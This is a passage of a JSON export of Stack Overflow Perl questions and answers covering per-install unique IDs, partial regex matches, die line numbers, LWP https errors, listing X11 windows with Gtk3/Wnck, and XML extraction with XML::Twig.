href=\"https://stackoverflow.com/questions/37954976/how-can-i-make-each-instance-of-a-perl-script-have-its-own-unique-id/37958632#comment63358805_37955103\"><em>\"it needs to be the same value for any given user\"</em></a>, so I'm no longer sure that my answer will satisfy your requirements</p>\n\n<hr>\n\n<p>I suggest that you use the system UUID returned by <code>dmidecode</code>. Of course you will need to have it installed on your computer, and there's a parser module for it on CPAN called <a href=\"https://metacpan.org/pod/Parse::DMIDecode\" rel=\"nofollow noreferrer\"><code>Parse::DMIDecode</code></a></p>\n\n<p>It's slightly more complex if you have to support Windows systems. You can use <a href=\"http://gnuwin32.sourceforge.net/packages/dmidecode.htm\" rel=\"nofollow noreferrer\"><em>DmiDecode for Windows</em></a>, which is available as a ready-built binary, but the parser module explicitly checks that there are no colons (amongst other things) in the path to the <code>demidecode</code> executable, so a call to the <code>probe</code> method won't work. Instead you must call <code>demidecode</code> and pass the result to the <code>parse</code> method</p>\n\n<p>This short example works fine on both Linux and Windows</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\nuse feature 'say';\n\nuse Parse::DMIDecode;\n\nmy $decoder = Parse::DMIDecode-&gt;new;\n$decoder-&gt;parse(qx{dmidecode});\n\nsay $decoder-&gt;keyword('system-uuid');\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>35304535-3439-4344-3232-3245FFFFFFFF\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "is_accepted": false, "score": 1, "last_activity_date": 1466651407, "creation_date": 1466651407, "answer_id": 37981681, "question_id": 37954976, "link": "https://stackoverflow.com/questions/37954976/how-can-i-make-each-instance-of-a-perl-script-have-its-own-unique-id/37981681#37981681", "title": "How can I make each instance of a perl script have its own unique id?", "body": "<p>Make the last line of your script <code>__DATA__</code> and append the ID to the script either at installation or first run.  Reading from the special <code>&lt;DATA&gt;</code> handle reads the data segment of a script.</p>\n"}], "owner": {"reputation": 3734, "user_id": 425893, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/150bcdb3aa4e2b8096065f19f1b6d568?s=128&d=identicon&r=PG", "display_name": "John O", "link": "https://stackoverflow.com/users/425893/john-o"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 253, "favorite_count": 0, "answer_count": 3, "score": -2, "last_activity_date": 1466651407, "creation_date": 1466544921, "question_id": 37954976, "link": "https://stackoverflow.com/questions/37954976/how-can-i-make-each-instance-of-a-perl-script-have-its-own-unique-id", "title": "How can I make each instance of a perl script have its own unique id?", "body": "<p>I have a perl script that connects to the Plex API. It logs in and performs certain actions (mostly working).</p>\n\n<p>However, the Plex API suggests (insists?) that each instance of the script send a unique ID, such that if I share this script with anyone else they should use a different string.</p>\n\n<p>In the interests of keeping this simple, I don't want to have some configuration file that keeps that value outside of the script. I also can't leave a value hard-coded in, no one who downloads this will change it.</p>\n\n<p>Could the perl script modify itself?</p>\n\n<p>If I were to declare it as such:</p>\n\n<pre><code>my $uuid = 1;\n</code></pre>\n\n<p>... then could I not check immediately afterward if this value is equal to 1, and if so overwrite that with a randomly generated uuid? The script would then exit, but somehow re-invoke itself (so the user doesn't have to run it a second time).</p>\n\n<p>Is there a safe way to do this? Alternatively, is there a better way to accomplish the goal without using this method?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466542234, "post_id": 37954315, "comment_id": 63357091, "body": "So if <code>$str</code> were <code>Copyright (foo)</code> you would just want to print <code>Copyright (</code>?"}, {"owner": {"reputation": 2315, "user_id": 2748513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a57ccf0bf2588656bdef02373a0aaa71?s=128&d=identicon&r=PG&f=1", "display_name": "rodee", "link": "https://stackoverflow.com/users/2748513/rodee"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466542623, "post_id": 37954315, "comment_id": 63357287, "body": "@ThisSuitIsBlackNot, yes"}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1466543075, "post_id": 37954315, "comment_id": 63357510, "body": "Depending on version, <code>${^PREMATCH}</code>"}, {"owner": {"reputation": 658, "user_id": 5543203, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/bdYF4.png?s=128&g=1", "display_name": "Henrik supports the community", "link": "https://stackoverflow.com/users/5543203/henrik-supports-the-community"}, "edited": false, "score": 0, "creation_date": 1466543590, "post_id": 37954315, "comment_id": 63357747, "body": "<code>${^PREMATCH}</code> is the part of the string up to the part that matches the regexp. In this case the string just doesn&#39;t match."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1466543649, "post_id": 37954315, "comment_id": 63357779, "body": "@stevieb 1) That returns the text <i>before</i> the match, not the text that actually matched 2) Even if it did return the correct text, it would only work if the entire pattern matched"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1466544180, "post_id": 37954315, "comment_id": 63358017, "body": "The concept makes no sense as defined. The regex engine usually backtracks NUMEROUS times, so there are many many many partial matches. Ignoring the fact that <code>Copyr</code> is also a partial match in your example, consider what would happen if the name was <code>Cory</code> instead of <code>Wordsworth</code>. That would mean that <code>Co</code> in <code>Cory</code> would also be a partial match. Please provide a better definition of what you want to do."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1466546208, "post_id": 37954315, "comment_id": 63358792, "body": "@ikegami I think they want the longest common prefix, except the prefix is a regex instead of a fixed string."}, {"owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "edited": false, "score": 0, "creation_date": 1466551495, "post_id": 37954315, "comment_id": 63360468, "body": "<a href=\"http://search.cpan.org/~rsavage/Regexp-Assemble-0.37/lib/Regexp/Assemble.pm\" rel=\"nofollow noreferrer\">search.cpan.org/~rsavage/Regexp-Assemble-0.37/lib/Regexp/&hellip;</a>"}, {"owner": {"reputation": 2315, "user_id": 2748513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a57ccf0bf2588656bdef02373a0aaa71?s=128&d=identicon&r=PG&f=1", "display_name": "rodee", "link": "https://stackoverflow.com/users/2748513/rodee"}, "edited": false, "score": 1, "creation_date": 1466602717, "post_id": 37954315, "comment_id": 63385393, "body": "I want add a mark, like <code>^</code> where the pattern match fails, so it will be easy to identify where the mismatch is, e.g, if <code>$str</code> has <code>Copyright (c) 2008,2009-2011 by Bill Shaakespeare</code>, then I like to print <code>Copyright (c) 2008,2009-2011 by Bill Shaa^kespeare</code> so its easy to identify the typos."}], "answers": [{"tags": [], "owner": {"reputation": 497, "user_id": 668247, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9753585e9c97a4009c17adffe41f9f47?s=128&d=identicon&r=PG", "display_name": "vikin9", "link": "https://stackoverflow.com/users/668247/vikin9"}, "is_accepted": false, "score": 0, "last_activity_date": 1466580644, "creation_date": 1466580644, "answer_id": 37961344, "question_id": 37954315, "link": "https://stackoverflow.com/questions/37954315/in-perl-pattern-match-print-the-matched-string-up-to-the-match/37961344#37961344", "title": "In Perl pattern match, print the matched string up to the match", "body": "<p>Assume a standard BibTeX processed entry (bbl) starting with</p>\n\n<pre><code>$string ='\\bibitem{bibtex_key} rest';\n</code></pre>\n\n<p>You can extract the two parts using the following line:</p>\n\n<pre><code> my ($bibtex_key, $rest) = $string =~ m/\\\\bibitem\\{(.*)\\}(.*)/;\n</code></pre>\n\n<p>Now you can easily adapt it to your needs :)</p>\n"}], "owner": {"reputation": 2315, "user_id": 2748513, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a57ccf0bf2588656bdef02373a0aaa71?s=128&d=identicon&r=PG&f=1", "display_name": "rodee", "link": "https://stackoverflow.com/users/2748513/rodee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 118, "favorite_count": 2, "answer_count": 1, "score": 1, "last_activity_date": 1466580644, "creation_date": 1466542116, "last_edit_date": 1466542309, "question_id": 37954315, "link": "https://stackoverflow.com/questions/37954315/in-perl-pattern-match-print-the-matched-string-up-to-the-match", "title": "In Perl pattern match, print the matched string up to the match", "body": "<p>Is there a way to print just the matched string upto the match?</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $match_re = qr/\\QCopyright (c) \\E( \\d .* ) \\Q by Bill Shakespeare.\\E/xi;\n\nmy $str = 'Copyright (c) 2008,2009-2011 by Wordsworth';\n\nif ($str =~ $match_re) {\n   print \"\\ncomplete match\\n\";\n} else {\n   print \"\\npartial match: \\n\";\n}\n</code></pre>\n\n<p>In this example, I want to print <code>partial match: Copyright (c) 2008,2009-2011 by</code> because it matched up to this.</p>\n"}, {"tags": ["perl", "file", "line", "handler"], "answers": [{"comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1466542735, "post_id": 37954134, "comment_id": 63357328, "body": "Or since the argument to your script is <code>DPX_*</code>, the trouble could come from line ~18004 of any of the input files, or on the 18000th line of the concatenation of all your input."}, {"owner": {"reputation": 21, "user_id": 5223349, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0488fa58b0c2eee302677fbf7552d154?s=128&d=identicon&r=PG&f=1", "display_name": "ALON", "link": "https://stackoverflow.com/users/5223349/alon"}, "edited": false, "score": 0, "creation_date": 1466576029, "post_id": 37954134, "comment_id": 63367044, "body": "Thanks! i have only 1500 lines, my script fails in line 111 and 18004 ?! deferentially it goes to some other code below which i dont handle. i am manipulating large data files from many libraries starts with DPX_... Maybe there is a specific module to gain better performance with easier maintenance?"}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 2, "last_activity_date": 1466541416, "creation_date": 1466541416, "answer_id": 37954134, "question_id": 37953835, "link": "https://stackoverflow.com/questions/37953835/error-when-redirecting-data-to-file/37954134#37954134", "title": "Error when redirecting data to file", "body": "<p>From <a href=\"https://metacpan.org/pod/perlfunc#die-LIST\" rel=\"nofollow\"><code>perldoc -f die</code></a>:</p>\n\n<blockquote>\n  <p>If the last element of LIST does not end in a newline, the current script line number and <strong>input line number (if any)</strong> are also printed, and a newline is supplied. [<em>Emphasis added</em>]</p>\n</blockquote>\n\n<p>The \"input line number\" is the value in <a href=\"https://metacpan.org/pod/perlvar#INPUT_LINE_NUMBER\" rel=\"nofollow\"><code>$.</code></a>, roughly the number of lines of input you have read from the most recent filehandle you accessed.</p>\n\n<p>In your case, you could use to look at your program input and see if there is anything unusual around line 18004 that your program wasn't expecting.</p>\n"}], "owner": {"reputation": 21, "user_id": 5223349, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0488fa58b0c2eee302677fbf7552d154?s=128&d=identicon&r=PG&f=1", "display_name": "ALON", "link": "https://stackoverflow.com/users/5223349/alon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 29, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1466541416, "creation_date": 1466540316, "last_edit_date": 1466540624, "question_id": 37953835, "link": "https://stackoverflow.com/questions/37953835/error-when-redirecting-data-to-file", "title": "Error when redirecting data to file", "body": "<p>Frequently [not always] when i run procedure define a file handler i get strange error on internal function which i dont understand how to debug.\nIn My PERL code i have the following line [111]:\n<strong><em>open V_FILE_SEC, \">>$file/V_$file$dir.csvT\" or die $!;</em></strong></p>\n\n<p>And when i am operating the script [>myscript.pl DPX_*] i get:</p>\n\n<p>\"No such file or directory at myscript.pl line 111,  line 18004.\"</p>\n\n<p>What is the meaning of line 18004? How to start debug?</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["perl", "lwp"], "comments": [{"owner": {"reputation": 28990, "user_id": 1114966, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/af8712b05e5cfb862323a07c83749054?s=128&d=identicon&r=PG", "display_name": "squiguy", "link": "https://stackoverflow.com/users/1114966/squiguy"}, "edited": false, "score": 0, "creation_date": 1466533582, "post_id": 37951766, "comment_id": 63352300, "body": "Have you tried seeing what <code>$!</code> says?"}, {"owner": {"reputation": 191, "user_id": 5223984, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/4pzKT.jpg?s=128&g=1", "display_name": "Compysaurus", "link": "https://stackoverflow.com/users/5223984/compysaurus"}, "edited": false, "score": 0, "creation_date": 1466534065, "post_id": 37951766, "comment_id": 63352587, "body": "$! says &quot;No such file or directory&quot; so it&#39;s probably being blocked from accessing external URLs.  Now I need to figure out how to unblock it."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1466535038, "post_id": 37951766, "comment_id": 63353245, "body": "<code>$!</code> is only meaningful after making a system call that returned false. You didn&#39;t make a system call. Again, you&#39;ll need to use LWP::UserAgent to see the error message."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1466535144, "post_id": 37951766, "comment_id": 63353303, "body": "Likely possibilities (in no particular order): *) Blocked by firewall. *) Certificate issue. *) Proxy needed. *) SELinux or other hardening system preventing outgoing connections."}, {"owner": {"reputation": 191, "user_id": 5223984, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/4pzKT.jpg?s=128&g=1", "display_name": "Compysaurus", "link": "https://stackoverflow.com/users/5223984/compysaurus"}, "edited": false, "score": 0, "creation_date": 1466536510, "post_id": 37951766, "comment_id": 63354116, "body": "I used LWP::UserAgent as suggested and it turns out I didn&#39;t have &quot; LWP::Protocol::https&quot; installed.  Whoops.  Installing that fixed the problem. Thanks everyone (especially those who suggested UserAgent).  Glad it wasn&#39;t more complicated."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1466536671, "post_id": 37951766, "comment_id": 63354224, "body": "@Compysaurus Great! Please write an answer so it&#39;s easier for future visitors to see what you did."}], "answers": [{"tags": [], "owner": {"reputation": 191, "user_id": 5223984, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/4pzKT.jpg?s=128&g=1", "display_name": "Compysaurus", "link": "https://stackoverflow.com/users/5223984/compysaurus"}, "is_accepted": true, "score": 4, "last_activity_date": 1466538639, "last_edit_date": 1466538639, "creation_date": 1466537596, "answer_id": 37953088, "question_id": 37951766, "link": "https://stackoverflow.com/questions/37951766/perl-lwpsimple-wont-get-a-webpage-when-running-from-remote-server/37953088#37953088", "title": "Perl LWP::Simple won&#39;t &quot;get&quot; a webpage when running from remote server", "body": "<p>Turns out I didn't have LWP::Protocol::https\" installed.  I found this out by switching </p>\n\n<pre><code>LWP::Simple  \n</code></pre>\n\n<p>to </p>\n\n<pre><code>LWP::UserAgent \n</code></pre>\n\n<p>and adding the following: </p>\n\n<pre><code>my $ua = LWP::UserAgent-&gt;new;\nmy $resp = $ua-&gt;get('https://connects.catalyst.harvard.edu/Profiles/profile/xxxxxx/xxxxxxx.rdf' );\nprint $resp;\n</code></pre>\n\n<p>It then returned an error telling me it didn't have the protocol to access the https without LWP::Protocol::https, so I installed it with </p>\n\n<pre><code>cpan LWP::Protocol::https\n</code></pre>\n\n<p>and all was good.  </p>\n"}], "owner": {"reputation": 191, "user_id": 5223984, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/4pzKT.jpg?s=128&g=1", "display_name": "Compysaurus", "link": "https://stackoverflow.com/users/5223984/compysaurus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 194, "favorite_count": 0, "accepted_answer_id": 37953088, "answer_count": 1, "score": 1, "last_activity_date": 1466538639, "creation_date": 1466533100, "last_edit_date": 1466533429, "question_id": 37951766, "link": "https://stackoverflow.com/questions/37951766/perl-lwpsimple-wont-get-a-webpage-when-running-from-remote-server", "title": "Perl LWP::Simple won&#39;t &quot;get&quot; a webpage when running from remote server", "body": "<p>I'm trying to use Perl to scrape a publications list as follows:</p>\n\n<pre><code>use XML::XPath;\nuse XML::XPath::XMLParser;\nuse LWP::Simple;\n\nmy $url = \"https://connects.catalyst.harvard.edu/Profiles/profile/xxxxxxx/xxxxxx.rdf\";\n\nmy $content = get($url);\ndie \"Couldn't get publications!\" unless defined $content;\n</code></pre>\n\n<p>When I run it on my local (Windows 7) machine it works fine.  When I try to run it on the linux server where we are hosting some websites, it dies.  I installed XML and LWP using cpan so those should be there.  I'm wondering if the problem could be some sort of security or permissions on the server (keeping it from accessing an external website), but I don't even know where to start with that.  Any ideas?    </p>\n"}, {"tags": ["perl", "x11", "gtk3"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1466540881, "post_id": 37950679, "comment_id": 63356404, "body": "I am not familiar with programming in Gtk3, so I cannot help with the particular error you get.. but I have used a utility <a href=\"http://linux.die.net/man/1/wmctrl\" rel=\"nofollow noreferrer\"><code>wmctrl</code></a> that can list all open windows. It is <a href=\"https://packages.debian.org/source/jessie/wmctrl\" rel=\"nofollow noreferrer\">programmed in C</a>, so it should be possible to port the part of the code that lists the windows to Perl using XS or Inline::C"}, {"owner": {"reputation": 15836, "user_id": 1675492, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/HsMph.jpg?s=128&g=1", "display_name": "Ingo B&#252;rk", "link": "https://stackoverflow.com/users/1675492/ingo-b%c3%bcrk"}, "edited": false, "score": 0, "creation_date": 1466618954, "post_id": 37950679, "comment_id": 63396966, "body": "Why use GTK at all for this? Just make plain calls with Xlib and query the tree of the root window."}, {"owner": {"reputation": 936, "user_id": 2066126, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/224ed6420ee88dea389bb21ca1cfa0aa?s=128&d=identicon&r=PG", "display_name": "TheAmigo", "link": "https://stackoverflow.com/users/2066126/theamigo"}, "edited": false, "score": 0, "creation_date": 1466620574, "post_id": 37950679, "comment_id": 63397916, "body": "I&#39;m not trying to write a tool from scratch, I&#39;m trying to add a feature to an existing, large Gtk3 app."}], "answers": [{"tags": [], "owner": {"reputation": 936, "user_id": 2066126, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/224ed6420ee88dea389bb21ca1cfa0aa?s=128&d=identicon&r=PG", "display_name": "TheAmigo", "link": "https://stackoverflow.com/users/2066126/theamigo"}, "is_accepted": true, "score": 1, "last_activity_date": 1466620600, "creation_date": 1466620600, "answer_id": 37975857, "question_id": 37950679, "link": "https://stackoverflow.com/questions/37950679/how-to-list-all-x11-windows-using-gtk3gdk/37975857#37975857", "title": "How to list all X11 windows using Gtk3::Gdk", "body": "<p>I found a solution (although not my preferred one):</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse Gtk3 -init;\nuse Glib::Object::Introspection;\nGlib::Object::Introspection-&gt;setup(basename =&gt; 'GdkX11', version  =&gt; '3.0', package  =&gt; 'Gtk3::Gdk');\nGlib::Object::Introspection-&gt;setup(basename =&gt; 'Wnck', version  =&gt; '3.0', package  =&gt; 'Wnck');\n\nmy $screen = Wnck::Screen::get_default();\n$screen-&gt;force_update;\nfor my $win (@{$screen-&gt;get_windows}) {\n        my $name = $win-&gt;get_name;\n        my $ws = $win-&gt;get_workspace;\n        my $w = $ws ? $ws-&gt;get_number : -1;\n        printf \"(%04d, %04d) %04dx%04d:%2s $name\\n\", $win-&gt;get_geometry, $w;\n}\n</code></pre>\n\n<p>The reason I'd rather not use Wnck is because <a href=\"https://developer.gnome.org/libwnck/stable/getting-started.html\" rel=\"nofollow\">the documentation</a> says: <code>the use of this library is relatively expensive in terms of resources</code>.  My application doesn't need most of the features that Wnck offers so it's a bit overkill.</p>\n"}], "owner": {"reputation": 936, "user_id": 2066126, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/224ed6420ee88dea389bb21ca1cfa0aa?s=128&d=identicon&r=PG", "display_name": "TheAmigo", "link": "https://stackoverflow.com/users/2066126/theamigo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 360, "favorite_count": 2, "accepted_answer_id": 37975857, "answer_count": 1, "score": 2, "last_activity_date": 1466620600, "creation_date": 1466529342, "question_id": 37950679, "link": "https://stackoverflow.com/questions/37950679/how-to-list-all-x11-windows-using-gtk3gdk", "title": "How to list all X11 windows using Gtk3::Gdk", "body": "<p>I have a Perl Gtk3 script in which I'd like to get a list of all X11 windows open on the current display.</p>\n\n<p>So far, I have:</p>\n\n<pre><code>#!/usr/bin/perl -w\npackage Gtk3::Gdk::X11;\nuse strict;\nuse Glib::Object::Introspection;\nGlib::Object::Introspection-&gt;setup(basename =&gt; 'GdkX11', version  =&gt; '3.0', package  =&gt; 'Gtk3::Gdk');\n\npackage main;\nuse strict;\nuse Gtk3 -init;\nuse Data::Dumper;\nmy $x_root = Gtk3::Gdk::x11_get_default_root_xwindow();\nprint \"x_root = \" . Dumper $x_root;\nmy $gdk_screen = Gtk3::Gdk::Screen::get_default();\nprint \"gdk_screen = \" . Dumper $gdk_screen;\nmy $wm_name = $gdk_screen-&gt;get_window_manager_name;\nprint \"wm_name = '$wm_name'\\n\";\nmy $gdk_display = Gtk3::Gdk::Display::open(':0');\nprint \"gdk_display = \" . Dumper $gdk_display;\nmy $gdk_root = Gtk3::Gdk::X11Window::foreign_new_for_display($x_root, $gdk_display, $x_root);\nprint \"gdk_root = \" . Dumper $gdk_root;\nmy $a_net_client_list = Gtk3::Gdk::atom_intern('_NET_CLIENT_LIST', 1);\nprint \"a_net_client_list = \" . Dumper $a_net_client_list;\nmy $a_window = Gtk3::Gdk::atom_intern('WINDOW', 1);\nprint \"a_window = \" . Dumper $a_window;\nmy $wins = Gtk3::Gdk::property_get($gdk_root, $a_net_client_list, $a_window, 0, 1024, 0);\nprint \"wins = \" . Dumper $wins;\n</code></pre>\n\n<p>But that results in:</p>\n\n<pre><code>x_root = $VAR1 = 2443;\ngdk_screen = $VAR1 = bless( {}, 'Gtk3::Gdk::X11Screen' );\nwm_name = 'Xfwm4'\ngdk_display = $VAR1 = bless( {}, 'Gtk3::Gdk::X11Display' );\ngdk_root = $VAR1 = bless( {}, 'Gtk3::Gdk::X11Window' );\na_net_client_list = $VAR1 = bless( do{\\(my $o = 129)}, 'Gtk3::Gdk::Atom');\na_window = $VAR1 = bless( do{\\(my $o = 33)}, 'Gtk3::Gdk::Atom' );\n**\nERROR:gperl-i11n-marshal-struct.c:43:struct_to_sv: assertion failed: (!own)\nAborted (core dumped)\n</code></pre>\n\n<p>If there's a way to use libwnck3 in Perl, that might work too.</p>\n"}, {"tags": ["perl", "unix"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 3, "creation_date": 1466527107, "post_id": 37949245, "comment_id": 63348760, "body": "What are you trying to extract exactly? Because this sounds like a job for a parser... and you&#39;re trying to parse XML to get some semantically identical XML. Which is a bit odd really, and sounds like an XY problem."}, {"owner": {"reputation": 5296, "user_id": 418066, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/38yuw.png?s=128&g=1", "display_name": "Biffen", "link": "https://stackoverflow.com/users/418066/biffen"}, "edited": false, "score": 1, "creation_date": 1466536592, "post_id": 37949245, "comment_id": 63354182, "body": "(<a href=\"https://en.wikipedia.org/wiki/Cat_(Unix)#Useless_use_of_cat\" rel=\"nofollow noreferrer\">Useless use of <code>cat</code>.</a>)"}], "answers": [{"tags": [], "owner": {"reputation": 27, "user_id": 6494922, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3af7866952534f12a39267d5bc992c59?s=128&d=identicon&r=PG&f=1", "display_name": "Val.M", "link": "https://stackoverflow.com/users/6494922/val-m"}, "is_accepted": false, "score": 0, "last_activity_date": 1466526711, "creation_date": 1466526711, "answer_id": 37949919, "question_id": 37949245, "link": "https://stackoverflow.com/questions/37949245/extract-multiple-lines-of-text-in-xml/37949919#37949919", "title": "Extract multiple lines of text in XML", "body": "<p>From what I've tried it seems egrep cannot match multiple lines, you could use pcregrep -M instead</p>\n\n<pre><code>pcregrep -M 'com.eds.travel.fares.ping.response((.|\\n)*)com.eds.travel.fares.ping.response'\n</code></pre>\n\n<p>did the trick for me</p>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1466583629, "creation_date": 1466583629, "answer_id": 37962390, "question_id": 37949245, "link": "https://stackoverflow.com/questions/37949245/extract-multiple-lines-of-text-in-xml/37962390#37962390", "title": "Extract multiple lines of text in XML", "body": "<p>Rule one of XML. Don't use regex. XML is a contextual language, and regular expressions cannot do that. You will have a hack, which will be brittle, and one day mysteriously break when the XML changes in a PERFECTLY VALID way. </p>\n\n<p>So instead, use a parser. Perl has several options - I happen to like <code>XML::Twig</code> for being a good starting point (<code>XML::LibXML</code> is also excellent, but a steeper learning curve).</p>\n\n<p>And for this, all you need is:</p>\n\n<pre><code>#!usr/bin/perl\nuse strict;\nuse warnings;\n\nuse XML::Twig;\n\nmy $twig = XML::Twig -&gt; new ( comments =&gt; 'drop' )-&gt;parse ( \\*DATA ); \n$twig -&gt; set_pretty_print('indented_a');\n$twig -&gt; get_xpath('//com.eds.travel.fares.ping.response',0  ) -&gt; print;\n\n\n__DATA__\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;  \n&lt;!--This is a Ping Response--&gt;\n&lt;com.eds.travel.fares.ping.response xmlns=\"http://schemas.eds.com/transportation/message/ping/response\" targetNamespace=\"http://schemas.eds.com/transportation/message/ping/response\" EchoToken=\"00c0d1a\" 